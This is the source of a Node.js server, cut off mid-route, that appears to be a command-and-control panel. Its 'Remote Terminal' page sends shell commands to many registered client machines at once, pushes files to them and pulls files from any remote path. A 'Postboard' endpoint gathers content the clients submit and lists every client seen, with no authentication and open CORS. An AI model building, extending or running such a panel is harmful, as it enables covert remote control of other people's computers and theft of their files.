const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);

const io = new Server(server, {
  transports: ['websocket', 'polling'],
  cors: { origin: "*", methods: ["GET", "POST"] },
  pingInterval: 25000,
  pingTimeout: 60000
});

app.set('trust proxy', 1);

// ---------- Body parsing + CORS (for /submission) ----------
app.use(express.json({ limit: '50mb' }));
app.use(express.text({ limit: '50mb' }));
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, X-Client-UUID');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

// ---------- Existing state ----------
const clients = new Map();          // uuid -> { socket, cwd, env, epoch }
const viewers = new Map();          // uuid -> Set of sockets
const masters = new Set();          // Set of sockets
const clientHeartbeats = new Map(); // uuid -> lastHeartbeat ts

// ---------- Postboard state ----------
const SUBMISSIONS_PATH = path.join(__dirname, 'submissions.json');
let submissions = [];
let submissionCounter = 0;

function loadSubmissions() {
  try {
    if (!fs.existsSync(SUBMISSIONS_PATH)) return;
    const raw = fs.readFileSync(SUBMISSIONS_PATH, 'utf8');
    const arr = JSON.parse(raw);
    if (Array.isArray(arr)) {
      submissions = arr;
      arr.forEach(s => {
        if (typeof s.id === 'number' && s.id > submissionCounter) submissionCounter = s.id;
      });
      console.log(`[Postboard] Loaded ${submissions.length} submission(s)`);
    }
  } catch (err) {
    console.error('[Postboard] Failed to load submissions:', err.message);
  }
}

function saveSubmissions() {
  try {
    const tmp = SUBMISSIONS_PATH + '.tmp';
    fs.writeFileSync(tmp, JSON.stringify(submissions, null, 2));
    fs.renameSync(tmp, SUBMISSIONS_PATH);
  } catch (err) {
    console.error('[Postboard] Failed to save submissions:', err.message);
  }
}

loadSubmissions();

// ---------- Seen-UUIDs persistence ----------
const SEEN_UUIDS_PATH = path.join(__dirname, 'seen_uuids.json');
let seenUUIDs = [];                 // array of { uuid, firstSeen, lastSeen }
let seenUUIDsMap = new Map();       // uuid -> entry

function loadSeenUUIDs() {
  try {
    if (!fs.existsSync(SEEN_UUIDS_PATH)) return;
    const raw = fs.readFileSync(SEEN_UUIDS_PATH, 'utf8');
    const arr = JSON.parse(raw);
    if (Array.isArray(arr)) {
      seenUUIDs = arr.filter(e => e && typeof e.uuid === 'string');
      seenUUIDsMap = new Map();
      seenUUIDs.forEach(e => seenUUIDsMap.set(e.uuid, e));
      console.log(`[Seen] Loaded ${seenUUIDs.length} seen UUID(s)`);
    }
  } catch (err) {
    console.error('[Seen] Failed to load:', err.message);
  }
}

function saveSeenUUIDs() {
  try {
    const tmp = SEEN_UUIDS_PATH + '.tmp';
    fs.writeFileSync(tmp, JSON.stringify(seenUUIDs, null, 2));
    fs.renameSync(tmp, SEEN_UUIDS_PATH);
  } catch (err) {
    console.error('[Seen] Failed to save:', err.message);
  }
}

function markUUIDSeen(uuid) {
  if (!uuid || typeof uuid !== 'string') return;
  const now = Date.now();
  const existing = seenUUIDsMap.get(uuid);
  if (existing) {
    // Only persist lastSeen changes at most once per minute to reduce disk writes
    const shouldSave = (now - existing.lastSeen) > 60000;
    existing.lastSeen = now;
    if (shouldSave) saveSeenUUIDs();
  } else {
    const entry = { uuid, firstSeen: now, lastSeen: now };
    seenUUIDs.push(entry);
    seenUUIDsMap.set(uuid, entry);
    saveSeenUUIDs();
  }
}

loadSeenUUIDs();

// =====================================================
// ============== public-server/index.html =============
// =====================================================
const publicDir = path.join(__dirname, 'public-server');
if (!fs.existsSync(publicDir)) fs.mkdirSync(publicDir, { recursive: true });

const indexHtml = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Remote Terminal</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { height: 100%; background: #121212; color: #eee; font-family: 'Courier New', monospace; }
    body { display: flex; flex-direction: column; height: 100vh; overflow: hidden; }

    #terminal {
      flex: 1 1 auto;
      min-height: 0;
      padding: 15px;
      overflow-y: auto;
      white-space: pre-wrap;
      font-size: 13px;
      line-height: 1.4;
    }
    #inputLine {
      flex: 0 0 auto;
      background: #1a1a1a;
      padding: 8px 15px;
      border-top: 1px solid #333;
    }
    #cmd {
      width: 100%;
      background: transparent;
      border: none;
      color: #0f0;
      font-family: 'Courier New', monospace;
      font-size: 13px;
    }
    #cmd:focus { outline: none; }

    .output { margin: 2px 0; display: flex; gap: 8px; align-items: flex-start; }
    .error { color: #f55; }
    .system { color: #3af; }
    .command { color: #5f5; }
    .lineCheckbox { margin-top: 2px; cursor: pointer; }
    ::-webkit-scrollbar { width: 8px; }
    ::-webkit-scrollbar-track { background: #1a1a1a; }
    ::-webkit-scrollbar-thumb { background: #444; border-radius: 4px; }
    ::-webkit-scrollbar-thumb:hover { background: #666; }

    #controlBar {
      position: fixed; right: 12px; bottom: 72px;
      background: #1a1a1a; border: 1px solid #333;
      padding: 10px; border-radius: 6px;
      display: flex; flex-direction: column; gap: 6px;
      z-index: 1000; color: #ddd; font-size: 12px;
      min-width: 280px; max-width: 360px;
    }
    #selectedList { max-width: 340px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; word-break: break-all; }
    button { background: #2a2a2a; color: #eee; border: 1px solid #333; padding: 6px 8px; border-radius: 4px; cursor: pointer; font-family: 'Courier New', monospace; font-size: 11px; }
    button:hover { background: #3a3a3a; }
    .modeToggle { display: flex; gap: 4px; align-items: center; flex-wrap: wrap; }
    .modeToggle label { display: flex; align-items: center; gap: 4px; cursor: pointer; }
    .modeToggle input[type="radio"] { accent-color: #0f0; cursor: pointer; }
    .modeLabel { font-weight: bold; }
    .mode-none { color: #aaa; }
    .mode-include { color: #5f5; }
    .mode-exclude { color: #f55; }
    .mode-indicator { padding: 2px 6px; border-radius: 3px; font-size: 10px; font-weight: bold; }
    .mode-indicator.none { background: #aaa2; color: #aaa; border: 1px solid #aaa8; }
    .mode-indicator.include { background: #0f02; color: #5f5; border: 1px solid #0f08; }
    .mode-indicator.exclude { background: #f002; color: #f55; border: 1px solid #f008; }
    .selectedInfo { color: #888; font-size: 10px; }
    .line-highlight { background: #ffffff08; }

    #fileSection { border-bottom: 1px solid #333; padding-bottom: 6px; margin-bottom: 2px; }
    .file-label { color: #aaa; font-size: 10px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 3px; }
    .file-row { display: flex; gap: 4px; align-items: center; margin-bottom: 4px; }
    .file-row input[type="file"] { font-family: 'Courier New', monospace; font-size: 10px; color: #ddd; width: 100%; }
    .file-row input[type="file"]::-webkit-file-upload-button { background: #2a2a2a; color: #eee; border: 1px solid #333; padding: 4px 6px; border-radius: 4px; cursor: pointer; font-family: 'Courier New', monospace; font-size: 10px; }
    .file-row input[type="file"]::-webkit-file-upload-button:hover { background: #3a3a3a; }
    .file-row input[type="text"] { flex: 1; background: #0a0a0a; border: 1px solid #333; color: #eee; padding: 4px 6px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 11px; }
    .file-btn { background: #1a3a1a; border: 1px solid #0f08; }
    .file-btn:hover { background: #2a5a2a; }
    .file-btn-small { padding: 4px 6px; font-size: 10px; }
    #fileProgress { position: fixed; left: 50%; top: 50%; transform: translate(-50%, -50%); background: #1a1a1a; border: 1px solid #0f08; padding: 20px; border-radius: 8px; display: none; z-index: 2000; text-align: center; min-width: 320px; }
    #fileProgress .progress-label { margin-bottom: 8px; font-size: 13px; }
    #fileProgress .progress-bar-bg { width: 100%; height: 14px; background: #2a2a2a; border-radius: 7px; overflow: hidden; }
    #fileProgress .progress-bar-fill { height: 100%; width: 0%; background: #0f0; border-radius: 7px; transition: width 0.3s; }
    #fileProgress .progress-pct { margin-top: 6px; font-size: 11px; color: #aaa; }
  </style>
</head>
<body>
  <div id="terminal"></div>

  <div id="controlBar" title="Selection & File Controls">
    <div id="fileSection">
      <div class="file-label">Upload File to Client(s)</div><br>
      <div class="file-row">
        <input type="file" id="uploadFileInput" />
      </div><br>
      <div class="file-row">
        <button id="uploadBtn" class="file-btn file-btn-small" style="width:100%">Upload</button>
      </div><br>
      <div class="file-label" style="margin-top:4px">Download File from Client</div><br>
      <div class="file-row">
        <input type="text" id="downloadPath" placeholder="remote file path..." />
        <button id="downloadBtn" class="file-btn file-btn-small">Get</button>
      </div><br>
    </div>
    <div class="modeToggle">
      <span class="modeLabel">Mode:</span>
      <label><input type="radio" name="selMode" value="none" checked /> <span class="mode-none">None</span></label>
      <label><input type="radio" name="selMode" value="include" /> <span class="mode-include">Include</span></label>
      <label><input type="radio" name="selMode" value="exclude" /> <span class="mode-exclude">Exclude</span></label>
      <span id="modeBadge" class="mode-indicator none">NONE</span>
    </div>
    <div id="selectedList" class="selectedInfo">All clients targeted</div>
    <button id="clearBtn">Clear Selections</button>
  </div>

  <div id="fileProgress">
    <div class="progress-label" id="progressLabel">Transferring...</div>
    <div class="progress-bar-bg"><div class="progress-bar-fill" id="progressFill"></div></div>
    <div class="progress-pct" id="progressPct">0%</div>
  </div>

  <div id="inputLine">
    <input type="text" id="cmd" autocomplete="off" spellcheck="false" placeholder="Type command..." autofocus />
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    var socket = null;
    var terminal = document.getElementById('terminal');
    var input = document.getElementById('cmd');
    var selectedUUIDs = new Set();
    var excludedUUIDs = new Set();
    var selectionMode = 'none';
    var commandHistory = [];
    var historyIndex = -1;
    var lastCtrlClickedCheckbox = null;
    var downloadMeta = null;
    var pendingDownloadChunks = {};

    document.querySelectorAll('input[name="selMode"]').forEach(function(radio) {
      radio.addEventListener('change', function(e) {
        if (!e.target.checked) return;
        selectionMode = e.target.value;
        var badge = document.getElementById('modeBadge');
        badge.textContent = selectionMode.toUpperCase();
        badge.className = 'mode-indicator ' + selectionMode;
        updateSelectedList();
        document.querySelectorAll('.lineCheckbox').forEach(function(cb) {
          cb.disabled = (selectionMode === 'none');
        });
      });
    });

    function updateSelectedList() {
      var el = document.getElementById('selectedList');
      if (selectionMode === 'none') el.textContent = 'Mode: None — all clients targeted via normal input';
      else if (selectionMode === 'include') {
        if (selectedUUIDs.size === 0) el.textContent = 'Selected (include): none — command will go nowhere';
        else el.textContent = 'Selected (include): ' + Array.from(selectedUUIDs).join(', ');
      } else {
        if (excludedUUIDs.size === 0) el.textContent = 'Excluded: none — all clients targeted';
        else el.textContent = 'Excluded: ' + Array.from(excludedUUIDs).join(', ');
      }
    }

    function getAllVisibleUUIDs() {
      var uuids = new Set();
      document.querySelectorAll('.lineCheckbox:not(:disabled)').forEach(function(cb) {
        if (cb.dataset.uuid) uuids.add(cb.dataset.uuid);
      });
      return uuids;
    }

    function getTargetUUIDs() {
      if (selectionMode === 'none') return null;
      if (selectionMode === 'include') return new Set(selectedUUIDs);
      var all = getAllVisibleUUIDs();
      excludedUUIDs.forEach(function(id) { all.delete(id); });
      return all;
    }

    function makeLineElement(text, cls) {
      var wrapper = document.createElement('div');
      wrapper.className = 'output';
      if (cls) wrapper.classList.add(cls);
      var uuidMatch = text.match(/^\\[([0-9a-fA-F-]{8,36})\\]/);
      var checkbox = document.createElement('input');
      checkbox.type = 'checkbox';
      checkbox.className = 'lineCheckbox';
      if (uuidMatch) {
        checkbox.dataset.uuid = uuidMatch[1];
        checkbox.disabled = (selectionMode === 'none');
        checkbox.addEventListener('change', function(e) {
          var id = e.target.dataset.uuid;
          if (selectionMode === 'include') {
            if (e.target.checked) selectedUUIDs.add(id); else selectedUUIDs.delete(id);
          } else if (selectionMode === 'exclude') {
            if (e.target.checked) excludedUUIDs.add(id); else excludedUUIDs.delete(id);
          }
          updateSelectedList();
        });
        checkbox.addEventListener('click', function(e) {
          if (e.ctrlKey || e.metaKey) {
            e.preventDefault();
            var currentCb = e.target;
            if (lastCtrlClickedCheckbox && lastCtrlClickedCheckbox !== currentCb) {
              var allCheckboxes = Array.from(document.querySelectorAll('.lineCheckbox:not(:disabled)'));
              var startIdx = allCheckboxes.indexOf(lastCtrlClickedCheckbox);
              var endIdx = allCheckboxes.indexOf(currentCb);
              if (startIdx !== -1 && endIdx !== -1) {
                var lo = Math.min(startIdx, endIdx), hi = Math.max(startIdx, endIdx);
                for (var i = lo; i <= hi; i++) {
                  var cb = allCheckboxes[i];
                  var id = cb.dataset.uuid;
                  if (!id) continue;
                  cb.checked = true;
                  if (selectionMode === 'include') selectedUUIDs.add(id);
                  else if (selectionMode === 'exclude') excludedUUIDs.add(id);
                }
                updateSelectedList();
              }
            }
            lastCtrlClickedCheckbox = currentCb;
          } else {
            lastCtrlClickedCheckbox = null;
          }
        });
      } else {
        checkbox.disabled = true;
        checkbox.title = 'No UUID on this line';
      }
      var textDiv = document.createElement('div');
      textDiv.textContent = text;
      wrapper.appendChild(checkbox);
      wrapper.appendChild(textDiv);
      return wrapper;
    }

    function appendLine(text, cls) {
      var el = makeLineElement(text, cls);
      terminal.appendChild(el);
      terminal.scrollTop = terminal.scrollHeight;
    }

    function showProgress(label, pct) {
      document.getElementById('progressLabel').textContent = label;
      document.getElementById('progressFill').style.width = pct + '%';
      document.getElementById('progressPct').textContent = pct + '%';
      document.getElementById('fileProgress').style.display = 'block';
    }
    function hideProgress() {
      document.getElementById('fileProgress').style.display = 'none';
    }

    socket = io({
      reconnection: true,
      reconnectionDelay: 1000,
      reconnectionDelayMax: 5000,
      reconnectionAttempts: Infinity
    });

    socket.on('connect', function() {
      appendLine('[System] Connected to server', 'system');
      var pathName = window.location.pathname;
      if (pathName === '/master') {
        socket.emit('register-master');
      } else {
        var uuid = (pathName || '/').substring(1);
        if (uuid && uuid !== '') socket.emit('register-viewer', uuid);
      }
    });

    socket.on('connect_error', function(error) {
      appendLine('[System] Connection error: ' + (error.message || 'Unknown error'), 'error');
    });
    socket.on('disconnect', function(reason) {
      appendLine('[System] Disconnected from server: ' + reason, 'error');
    });
    socket.on('output', function(data) { appendLine(data); });
    socket.on('error', function(data) { appendLine(data, 'error'); });
    socket.on('system', function(data) { appendLine(data, 'system'); });
    socket.on('command', function(data) { appendLine('> ' + data, 'command'); });
    socket.on('directory', function(dir) { document.title = 'Remote Terminal - ' + dir; });
    socket.on('registered', function(id) {
      appendLine('[System] Registered with ID: ' + id, 'system');
    });

    socket.on('download-start', function(meta) {
      downloadMeta = meta;
      pendingDownloadChunks = {};
      showProgress('Downloading: ' + meta.name, 0);
      appendLine('[System] Starting download of "' + meta.name + '" (' + meta.size + ' bytes)', 'system');
    });

    socket.on('download-chunk', function(data) {
      if (!downloadMeta) return;
      pendingDownloadChunks[data.index] = data.chunk;
      var received = Object.keys(pendingDownloadChunks).length;
      var pct = Math.round((received / downloadMeta.totalChunks) * 100);
      showProgress('Downloading: ' + downloadMeta.name, Math.min(pct, 99));
    });

    socket.on('download-end', function() {
      if (!downloadMeta) return;
      hideProgress();
      var binary = '';
      for (var i = 0; i < downloadMeta.totalChunks; i++) {
        if (pendingDownloadChunks[i]) binary += pendingDownloadChunks[i];
      }
      try {
        var byteChars = atob(binary);
        var bytes = new Uint8Array(byteChars.length);
        for (var j = 0; j < byteChars.length; j++) bytes[j] = byteChars.charCodeAt(j);
        var blob = new Blob([bytes]);
        var url = URL.createObjectURL(blob);
        var a = document.createElement('a');
        a.href = url;
        a.download = downloadMeta.name;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        setTimeout(function() { URL.revokeObjectURL(url); }, 10000);
        appendLine('[System] Downloaded "' + downloadMeta.name + '" (' + downloadMeta.size + ' bytes)', 'system');
      } catch (e) {
        appendLine('[System] Download reassembly error: ' + e.message, 'error');
      }
      downloadMeta = null;
      pendingDownloadChunks = {};
    });

    socket.on('download-error', function(msg) {
      hideProgress();
      appendLine('[System] Download error: ' + msg, 'error');
      downloadMeta = null;
      pendingDownloadChunks = {};
    });

    socket.on('upload-complete', function(data) {
      hideProgress();
      appendLine('[System] Uploaded "' + data.name + '" to client(s) (' + data.size + ' bytes)', 'system');
    });
    socket.on('upload-error', function(msg) {
      hideProgress();
      appendLine('[System] Upload error: ' + msg, 'error');
    });
    socket.on('upload-progress', function(data) {
      showProgress('Uploading: ' + data.name, data.pct);
    });

    input.addEventListener('keydown', function(evt) {
      if (!socket || !socket.connected) return;
      if (evt.key === 'Enter') {
        var val = input.value.trim();
        if (val) {
          var targets = getTargetUUIDs();
          if (targets === null) socket.emit('command', val);
          else if (targets.size > 0) {
            socket.emit('targeted-command', { uuids: Array.from(targets), cmd: val });
            appendLine('[System] Sent targeted command to ' + targets.size + ' client(s): ' + val, 'system');
          } else {
            appendLine('[System] No target clients selected — command not sent', 'error');
          }
          commandHistory.push(val);
          historyIndex = commandHistory.length;
        }
        input.value = '';
      } else if (evt.key === 'ArrowUp') {
        evt.preventDefault();
        if (commandHistory.length && historyIndex > 0) {
          historyIndex--;
          input.value = commandHistory[historyIndex];
        }
      } else if (evt.key === 'ArrowDown') {
        evt.preventDefault();
        if (commandHistory.length && historyIndex < commandHistory.length - 1) {
          historyIndex++;
          input.value = commandHistory[historyIndex];
        } else {
          historyIndex = commandHistory.length;
          input.value = '';
        }
      }
    });

    document.getElementById('clearBtn').addEventListener('click', function() {
      selectedUUIDs.clear();
      excludedUUIDs.clear();
      document.querySelectorAll('.lineCheckbox').forEach(function(cb) { cb.checked = false; });
      lastCtrlClickedCheckbox = null;
      updateSelectedList();
    });

    document.getElementById('uploadBtn').addEventListener('click', function() {
      var fileInput = document.getElementById('uploadFileInput');
      if (!fileInput.files || fileInput.files.length === 0) {
        appendLine('[System] No file selected for upload', 'error');
        return;
      }
      var file = fileInput.files[0];
      var targets = getTargetUUIDs();
      var reader = new FileReader();
      reader.onload = function(e) {
        var base64 = e.target.result.split(',')[1];
        var chunkSize = 64 * 1024;
        var totalChunks = Math.ceil(base64.length / chunkSize);
        var uploadId = Date.now() + '-' + Math.random().toString(36).substr(2, 6);
        var meta = {
          uploadId: uploadId,
          name: file.name,
          size: file.size,
          totalChunks: totalChunks,
          chunkSize: chunkSize,
          targets: targets ? Array.from(targets) : null
        };
        socket.emit('upload-start', meta);
        var sent = 0;
        function sendNext() {
          if (sent >= totalChunks) {
            socket.emit('upload-end', { uploadId: uploadId, targets: targets ? Array.from(targets) : null });
            return;
          }
          var chunk = base64.substring(sent * chunkSize, (sent + 1) * chunkSize);
          socket.emit('upload-chunk', {
            uploadId: uploadId, index: sent, chunk: chunk,
            targets: targets ? Array.from(targets) : null
          });
          sent++;
          var pct = Math.round((sent / totalChunks) * 100);
          showProgress('Uploading: ' + file.name, pct);
          setTimeout(sendNext, 10);
        }
        sendNext();
      };
      reader.readAsDataURL(file);
    });

    document.getElementById('downloadBtn').addEventListener('click', function() {
      var remotePath = document.getElementById('downloadPath').value.trim();
      if (!remotePath) {
        appendLine('[System] No remote path specified for download', 'error');
        return;
      }
      var targets = getTargetUUIDs();
      if (targets === null) {
        socket.emit('download-request', { path: remotePath, targets: null });
        appendLine('[System] Requested download of "' + remotePath + '" from first available client', 'system');
      } else if (targets.size > 0) {
        var targetArr = Array.from(targets);
        socket.emit('download-request', { path: remotePath, targets: targetArr });
        appendLine('[System] Requested download of "' + remotePath + '" from ' + targetArr.length + ' client(s)', 'system');
      } else {
        appendLine('[System] No target clients selected for download', 'error');
      }
    });

    document.querySelectorAll('.lineCheckbox').forEach(function(cb) { cb.disabled = true; });
    updateSelectedList();
  </script>
</body>
</html>`;

fs.writeFileSync(path.join(publicDir, 'index.html'), indexHtml);

// =====================================================
// ============ public-server/postboard.html ===========
// =====================================================
const postboardHtml = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Postboard</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body {
      height: 100%;
      background: #121212;
      color: #eee;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
      font-size: 14px;
    }
    body { display: flex; flex-direction: column; height: 100vh; overflow: hidden; }

    header {
      flex: 0 0 auto;
      background: #1a1a1a;
      border-bottom: 1px solid #2a2a2a;
      padding: 12px 20px;
      display: flex;
      gap: 12px;
      align-items: center;
    }
    header h1 {
      font-size: 16px;
      font-weight: 600;
      color: #5f5;
      margin-right: 8px;
      white-space: nowrap;
    }
    header input {
      flex: 1;
      max-width: 500px;
      background: #0a0a0a;
      border: 1px solid #2a2a2a;
      color: #eee;
      padding: 8px 12px;
      border-radius: 4px;
      font-size: 13px;
      font-family: 'Courier New', monospace;
    }
    header input:focus {
      outline: none;
      border-color: #0f08;
    }
    header button {
      background: #2a2a2a;
      color: #eee;
      border: 1px solid #333;
      padding: 8px 12px;
      border-radius: 4px;
      cursor: pointer;
      font-size: 12px;
    }
    header button:hover { background: #3a3a3a; }
    #status {
      color: #888;
      font-size: 11px;
      white-space: nowrap;
    }

    #main {
      flex: 1 1 auto;
      display: flex;
      min-height: 0;
      overflow: hidden;
    }

    aside {
      flex: 0 0 280px;
      background: #161616;
      border-right: 1px solid #2a2a2a;
      display: flex;
      flex-direction: column;
      overflow: hidden;
    }
    aside .sidebar-header {
      padding: 10px 15px;
      font-size: 11px;
      text-transform: uppercase;
      letter-spacing: 1px;
      color: #888;
      border-bottom: 1px solid #2a2a2a;
      flex: 0 0 auto;
    }
    #uuidList {
      flex: 1 1 auto;
      overflow-y: auto;
      padding: 6px 0;
    }
    .uuid-item {
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 8px;
      padding: 8px 15px;
      cursor: pointer;
      color: #ccc;
      font-size: 12px;
      border: none;
      background: none;
      width: 100%;
      text-align: left;
      font-family: 'Courier New', monospace;
    }
    .uuid-item:hover { background: #1f1f1f; }
    .uuid-item.active { background: #0f02; color: #5f5; border-left: 3px solid #0f0; padding-left: 12px; }
    .uuid-item .uuid-label {
      flex: 1 1 auto;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
    }
    .uuid-item .count {
      flex: 0 0 auto;
      background: #2a2a2a;
      color: #aaa;
      font-size: 10px;
      padding: 1px 6px;
      border-radius: 10px;
    }
    .uuid-item.active .count { background: #0f03; color: #5f5; }
    .uuid-item .online-dot {
      display: inline-block;
      width: 6px;
      height: 6px;
      border-radius: 50%;
      background: #5f5;
      margin-right: 4px;
      vertical-align: middle;
    }

    main {
      flex: 1 1 auto;
      overflow-y: auto;
      padding: 16px 20px;
      min-height: 0;
    }

    .submission {
      background: #0d0d0d;
      border: 1px solid #2a2a2a;
      border-radius: 6px;
      margin-bottom: 12px;
      overflow: hidden;
    }
    .submission-header {
      background: #161616;
      padding: 8px 12px;
      border-bottom: 1px solid #2a2a2a;
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 12px;
      font-size: 11px;
      flex-wrap: wrap;
    }
    .submission-uuid {
      color: #5f5;
      font-family: 'Courier New', monospace;
      cursor: pointer;
    }
    .submission-uuid:hover { text-decoration: underline; }
    .submission-filename {
      color: #eee;
      font-weight: 600;
    }
    .submission-meta {
      color: #888;
      font-size: 10px;
      display: flex;
      gap: 12px;
    }
    .submission-body {
      padding: 10px 12px;
      font-family: 'Courier New', monospace;
      font-size: 12px;
      white-space: pre-wrap;
      word-break: break-all;
      color: #ddd;
      max-height: 300px;
      overflow-y: auto;
      background: #080808;
    }

    .empty-state {
      text-align: center;
      padding: 60px 20px;
      color: #555;
      font-size: 13px;
    }

    ::-webkit-scrollbar { width: 8px; height: 8px; }
    ::-webkit-scrollbar-track { background: #0a0a0a; }
    ::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
    ::-webkit-scrollbar-thumb:hover { background: #555; }
  </style>
</head>
<body>
  <header>
    <h1>Postboard</h1>
    <input id="searchInput" type="text" placeholder="Search by UUID, filename, or content..." autocomplete="off" spellcheck="false" />
    <button id="refreshBtn">Refresh</button>
    <span id="status">Loading...</span>
  </header>
  <div id="main">
    <aside>
      <div class="sidebar-header">Seen Clients</div>
      <div id="uuidList">
        <button class="uuid-item active" data-uuid=""><span class="uuid-label">All submissions</span><span class="count" id="allCount">0</span></button>
      </div>
    </aside>
    <main id="content">
      <div id="submissionList">
        <div class="empty-state">Loading…</div>
      </div>
    </main>
  </div>
  <script>
    (function() {
      var seenClients = [];
      var currentUUID = '';
      var currentSearch = '';
      var allSubmissions = [];
      var refreshTimer = null;

      function escapeHtml(s) {
        return String(s).replace(/[&<>"']/g, function(c) {
          return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];
        });
      }

      function formatTime(ts) {
        var now = Date.now();
        var diff = now - ts;
        if (diff < 60000) return Math.floor(diff/1000) + 's ago';
        if (diff < 3600000) return Math.floor(diff/60000) + 'm ago';
        if (diff < 86400000) return Math.floor(diff/3600000) + 'h ago';
        return new Date(ts).toLocaleString();
      }

      function renderSidebar() {
        var list = document.getElementById('uuidList');
        document.getElementById('allCount').textContent = allSubmissions.length;

        var existing = {};
        Array.from(list.querySelectorAll('.uuid-item')).forEach(function(el) {
          if (el.dataset.uuid) existing[el.dataset.uuid] = el;
        });

        seenClients.forEach(function(c) {
          var el = existing[c.uuid];
          if (!el) {
            el = document.createElement('button');
            el.className = 'uuid-item';
            el.dataset.uuid = c.uuid;
            el.addEventListener('click', function() { selectUUID(c.uuid); });
            list.appendChild(el);
          }
          delete existing[c.uuid];

          var onlineDot = c.online ? '<span class="online-dot"></span>' : '';
          el.innerHTML =
            '<span class="uuid-label">' + onlineDot + escapeHtml(c.uuid) + '</span>' +
            '<span class="count">' + c.submissionCount + '</span>';
          el.classList.toggle('active', currentUUID === c.uuid);
        });

        Object.keys(existing).forEach(function(k) { existing[k].remove(); });

        var allBtn = list.querySelector('.uuid-item[data-uuid=""]');
        if (allBtn) allBtn.classList.toggle('active', currentUUID === '');
      }

      function selectUUID(uuid) {
        currentUUID = uuid;
        renderSidebar();
        renderSubmissions();
      }

      function filterSubmissions() {
        var q = currentSearch.toLowerCase();
        var base = currentUUID
          ? allSubmissions.filter(function(s) { return s.uuid === currentUUID; })
          : allSubmissions;
        if (!q) return base;
        return base.filter(function(s) {
          return s.uuid.toLowerCase().indexOf(q) !== -1 ||
                 (s.filename || '').toLowerCase().indexOf(q) !== -1 ||
                 (s.content || '').toLowerCase().indexOf(q) !== -1;
        });
      }

      function renderSubmissions() {
        var list = document.getElementById('submissionList');
        var items = filterSubmissions();

        if (items.length === 0) {
          list.innerHTML = '<div class="empty-state">' +
            (currentSearch ? 'No submissions match "' + escapeHtml(currentSearch) + '"' :
             currentUUID ? 'No submissions from this client yet' :
             'No submissions yet') + '</div>';
          return;
        }

        var html = '';
        items.forEach(function(s) {
          var content = s.content || '';
          var truncated = content.length > 5000;
          var shown = truncated ? content.substring(0, 5000) + '\\n... [truncated]' : content;

          html += '<div class="submission">';
          html += '<div class="submission-header">';
          html += '<div>';
          html += '<span class="submission-filename">' + escapeHtml(s.filename || '(no name)') + '</span>';
          html += ' <span class="submission-uuid" data-uuid="' + escapeHtml(s.uuid) + '" title="Click to filter by this UUID">[' + escapeHtml(s.uuid) + ']</span>';
          html += '</div>';
          html += '<div class="submission-meta">';
          html += '<span>' + s.size + ' bytes</span>';
          html += '<span>' + formatTime(s.timestamp) + '</span>';
          html += '</div>';
          html += '</div>';
          html += '<div class="submission-body">' + escapeHtml(shown) + '</div>';
          html += '</div>';
        });
        list.innerHTML = html;

        list.querySelectorAll('.submission-uuid').forEach(function(el) {
          el.addEventListener('click', function() {
            selectUUID(el.dataset.uuid);
          });
        });
      }

      function fetchAll() {
        document.getElementById('status').textContent = 'Loading...';
        Promise.all([
          fetch('/api/seen').then(function(r) { return r.json(); }),
          fetch('/submissions').then(function(r) { return r.json(); })
        ]).then(function(results) {
          seenClients = Array.isArray(results[0]) ? results[0] : [];
          allSubmissions = Array.isArray(results[1]) ? results[1] : [];
          allSubmissions.sort(function(a, b) { return b.timestamp - a.timestamp; });

          renderSidebar();
          renderSubmissions();
          document.getElementById('status').textContent =
            allSubmissions.length + ' submissions · ' + seenClients.length + ' clients';
        }).catch(function(err) {
          document.getElementById('status').textContent = 'Error: ' + err.message;
        });
      }

      var searchInput = document.getElementById('searchInput');
      searchInput.addEventListener('input', function() {
        currentSearch = searchInput.value.trim();
        renderSubmissions();
      });

      document.getElementById('refreshBtn').addEventListener('click', fetchAll);

      fetchAll();
      refreshTimer = setInterval(function() {
        if (document.visibilityState === 'visible') fetchAll();
      }, 5000);
    })();
  </script>
</body>
</html>`;

fs.writeFileSync(path.join(publicDir, 'postboard.html'), postboardHtml);

// =====================================================
// ================= POSTBOARD ROUTES ==================
// =====================================================

app.post('/submission', (req, res) => {
  var body = req.body;
  var uuid, content, filename;

  if (typeof body === 'string') {
    uuid = (req.query.uuid || req.headers['x-client-uuid'] || '').toString().trim();
    content = body;
    filename = (req.query.filename || '').toString() || null;
  } else if (body && typeof body === 'object') {
    uuid = (body.uuid || '').toString().trim();
    content = body.content;
    filename = body.filename ? String(body.filename) : null;
  }

  if (!uuid || typeof uuid !== 'string') {
    return res.status(400).json({ error: 'Missing or invalid uuid' });
  }
  if (typeof content !== 'string') {
    return res.status(400).json({ error: 'Missing content (must be a string)' });
  }
  if (content.length === 0) {
    return res.status(400).json({ error: 'Empty content' });
  }
  if (content.length > 40 * 1024 * 1024) {
    return res.status(413).json({ error: 'Content too large (max 40 MB)' });
  }

  var submission = {
    id: ++submissionCounter,
    uuid: uuid,
    content: content,
    filename: filename,
    size: Buffer.byteLength(content, 'utf8'),
    timestamp: Date.now()
  };

  submissions.push(submission);
  saveSubmissions();
  markUUIDSeen(uuid);

